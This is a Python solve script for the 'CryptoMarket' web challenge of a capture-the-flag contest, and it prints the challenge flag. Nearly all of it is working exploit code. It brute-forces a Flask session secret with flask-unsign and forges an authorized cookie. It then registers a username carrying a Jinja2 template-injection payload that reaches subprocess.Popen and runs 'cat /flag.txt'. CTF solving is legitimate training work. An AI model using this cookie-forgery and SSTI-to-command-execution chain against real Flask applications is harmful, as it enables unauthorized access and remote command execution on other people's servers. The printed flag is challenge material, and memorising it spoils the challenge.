"""
CryptoMarket - Web - Medium
FLAG: DANTE{Mayb3_Flask_Is_n0T_That_s3cur3_00FD8124A}
"""

import requests
import subprocess

REMOTE = True
HOST = "cryptomarket.challs.dantectf.it" if REMOTE else "localhost:56565"
SCHEMA = "https://" if REMOTE else "http://"

session = requests.Session()


def create_wordlist_file():
    """Create a woirdlist of all possible 5 character strings using their provided alphabet and write it to a file"""
    alphabet = "abcdef0123456789"
    wordlist = []
    for i in alphabet:
        for j in alphabet:
            for k in alphabet:
                for l in alphabet:
                    for m in alphabet:
                        wordlist.append(i + j + k + l + m)
    with open("wordlist.txt", "w") as f:
        for word in wordlist:
            f.write(word + "\n")


def get_init_session():
    """
    We first have to get a session cookie by visiting the /refreshTime endpoint. It's the only endpoint that doesn't require authentication!
    """
    url = f"{SCHEMA}{HOST}/refreshTime"
    session.head(url)
    cookies = session.cookies.get_dict()
    return cookies["session"]


def get_secret_key(cookie):
    """
    Using flask-unsign, we can bruteforce the secret key used to sign the session cookie.
    """
    secret = subprocess.check_output(
        ["flask-unsign", "-u", "-c", cookie, "--wordlist=wordlist.txt"], text=True
    )
    return secret.strip().replace("\n", "").replace("'", "")


def get_authorized_session(secret, payload):
    """
    Using the secret key we obtained, we can craft a session cookie that will be accepted by the server.
    """
    return (
        subprocess.check_output(
            ["flask-unsign", "-s", "-c", payload, "-S", secret], text=True
        )
        .strip()
        .replace("\n", "")
        .replace("'", "")
    )


def register_and_login_to_ssti_account():
    """
    Typical SSTI to RCE via python class traversal.
    """
    print(session.cookies.get_dict())
    register_url = f"{SCHEMA}{HOST}/register"
    login_url = f"{SCHEMA}{HOST}/"
    creds = {
        "username": r"{{''.__class__.mro()[1].__subclasses__()[392]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",
        "password": "aaaaaaaa",
    }
    response = session.post(register_url, data=creds)
    response = session.post(login_url, data=creds)


def add_product():
    """
    We first need to add a product to the cart for the ssti payload to render on /showCart.
    """
    url = f"{SCHEMA}{HOST}/addToCart"
    payload = {
        "productid": 1,
    }
    session.post(url, data=payload)


def get_flag_from_cart():
    """
    The flag is in the response of /showCart, where our username is rendered.
    """
    url = f"{SCHEMA}{HOST}/showCart"
    response = session.get(url).text
    flag = response.split("DANTE{")[1].split("}")[0]
    return flag


def main():
    """
    Exploit! :)
    """
    # check if wordlist.txt exists first
    try:
        with open("wordlist.txt", "r") as f:
            pass
    except FileNotFoundError:
        create_wordlist_file()
    init_cookie = get_init_session()
    secret = get_secret_key(init_cookie)
    auth_cookie = get_authorized_session(secret, r'{"authorized": True}')
    session.cookies.set("session", auth_cookie, domain=HOST)
    register_and_login_to_ssti_account()
    add_product()
    print(f"Flag: DANTE{{{get_flag_from_cart()}}}")


if __name__ == "__main__":
    main()
